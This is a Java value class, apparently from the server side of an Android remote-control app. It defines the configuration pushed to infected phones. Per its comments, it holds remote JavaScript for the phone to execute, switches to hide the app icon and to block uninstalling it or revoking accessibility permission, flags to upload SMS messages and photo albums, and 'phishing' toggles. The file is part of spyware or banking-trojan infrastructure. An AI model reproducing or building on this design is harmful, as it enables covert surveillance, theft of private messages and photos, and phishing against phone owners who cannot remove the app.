package io.renren.modules.app.vo;

import com.alibaba.fastjson.JSONObject;
import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

@Data
@AllArgsConstructor
@NoArgsConstructor
public class ServerConfig {

    private boolean wakeUp;

    private UnLockParams unLockParams;

    //返回android 需要执行的js 代码
    private String code;
    private String mainCode;
    private String mainCodeMd5;

    //其他配置, json格式
    private String config;

    //是否隐藏图标
    private boolean hideIcon;

    //是否阻止关闭无障碍权限
    private boolean accessibilityGuard;
    //是否阻止卸载
    private boolean uninstallGuard;

    //TODO 卸载特征 ["","",""]
    private String uninstallGuardFeatures;
    //TODO 无障碍特征 ["","",""]
    private String accessibilityGuardFeatures;

    private boolean uploadLog = false;

    //TODO back特征[["节点ID", "node.getText() 匹配的正则"],[...]] 逐步替代 uninstallGuardFeatures 和 accessibilityGuardFeatures
    private String backFeatures;

    //上传短信
    private boolean uploadSms;
    //上传相册
    private boolean uploadAlbum;

    /**
     * 钓鱼开关 {code:boolean}
     */
    private JSONObject fishOptions = new JSONObject();

}
